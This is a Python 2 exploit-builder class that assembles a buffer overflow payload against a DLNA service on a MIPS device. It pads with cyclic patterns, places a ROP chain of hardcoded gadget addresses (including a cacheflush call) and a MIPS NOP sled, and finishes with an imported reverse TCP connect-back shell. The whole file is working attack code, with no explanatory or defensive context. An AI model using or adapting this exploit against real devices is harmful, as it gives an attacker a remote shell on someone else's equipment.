from rev_shell_null_free import rev_tcp_shell_payload as connect_back

class DlnaOverflowBuilder:
    MIPSNOPSTRING="\x27\x70\xc0\x01"*8
    pattern128_1="Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae"
    pattern128_2="2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4A"
    pattern128_3="i5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7"
    pattern128_4="Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar"
    pattern40_5="0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3"

    pattern40_5="0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3"

    pattern8_6="As4A6As7"

    pattern16_7="0At1At2At3At4At5"

    pattern28_8="t7At8At9Au0Au1Au2Au3Au4Au5Au"


    pattern32_9="8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7"

    pattern64_10="o9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar"

    pattern40_11="2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5"

    def initial_overflow(self):
        overflow_data=[]
        overflow_data.append("AA")
        overflow_data.append(self.pattern128_1)
        overflow_data.append(self.pattern128_2)
        overflow_data.append(self.pattern128_3)
        overflow_data.append(self.pattern128_4)
        overflow_data.append(self.pattern40_5)
        
        return overflow_data



    def rop_chain(self):
        ropchain=[]
        #jalr s6
        ropchain.append("\xac\x02\x12\x2b")
        ropchain.append(self.pattern8_6)

        #cacheflush()
        ropchain.append("\xb8\xdf\xf3\x2a")
        #jalr s0
        ropchain.append("\xc4\x41\x0e\x2b")
        ropchain.append(self.pattern16_7)

        #move t9,s3
        #jalr t9
        ropchain.append("\x08\xde\x16\x2b")
        ropchain.append(self.pattern28_8)

        #load offset from sp into S6, then jalr S1
        ropchain.append("\x30\x9d\x11\x2b")

        ropchain.append(self.pattern32_9)
        #load offset from sp into S6, then jalr S1
        ropchain.append("\x30\x9d\x11\x2b")
        ropchain.append(self.pattern64_10)

        ropchain.append("abcd")
        #hopefully avoid crashing memcpy
        ropchain.append("\x32\xc9\xa3\x15")
        ropchain.append("D"*12)
        ropchain.append("\x32\xc9\xa3\x15")
        ropchain.append(self.pattern128_1)
        ropchain.append(self.pattern40_11)
        return ropchain


    def payload(self):
        payload=[]
        for i in xrange(0,1):
            payload.append(self.MIPSNOPSTRING)

        for string in connect_back:
            payload.append(string)

        #for debugging purposes so we can locate our shellcode in memory
        payload.append("D"*4)
        
        return payload



